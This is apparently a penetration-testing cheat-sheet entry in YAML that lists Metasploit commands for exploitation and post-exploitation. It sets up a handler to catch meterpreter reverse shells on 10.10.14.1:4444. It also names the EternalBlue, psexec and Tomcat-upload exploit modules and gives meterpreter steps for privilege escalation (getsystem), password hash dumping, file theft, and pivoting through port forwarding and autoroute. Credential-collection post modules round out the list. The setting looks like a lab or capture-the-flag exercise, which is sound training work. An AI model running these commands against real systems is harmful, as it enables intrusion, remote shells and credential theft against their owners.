---
description: |
  Essential Metasploit commands and commonly used modules
  for exploitation and post-exploitation.
command: |
  # Start Metasploit
  msfconsole

  # Multi handler (catch reverse shells)
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST 10.10.14.1
  set LPORT 4444
  run

  # Common exploits
  use exploit/windows/smb/ms17_010_eternalblue
  use exploit/windows/smb/psexec
  use exploit/multi/http/tomcat_mgr_upload

  # Meterpreter commands
  sysinfo
  getuid
  getsystem
  hashdump
  upload /tmp/file C:\\Temp\\file
  download C:\\flag.txt /tmp/flag.txt
  shell
  portfwd add -l 8080 -p 80 -r 172.16.1.10
  run autoroute -s 172.16.1.0/24
  background

  # Post modules
  run post/windows/gather/enum_logged_on_users
  run post/multi/recon/local_exploit_suggester
  run post/windows/gather/credentials/credential_collector
phase:
  - Exploitation
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services:
  - SMB
  - HTTP
items:
  - No_Creds
  - Username
  - Password
techniques:
  - Reverse_Shell
network_position:
  - External
  - Internal
references:
  - https://docs.metasploit.com/
---
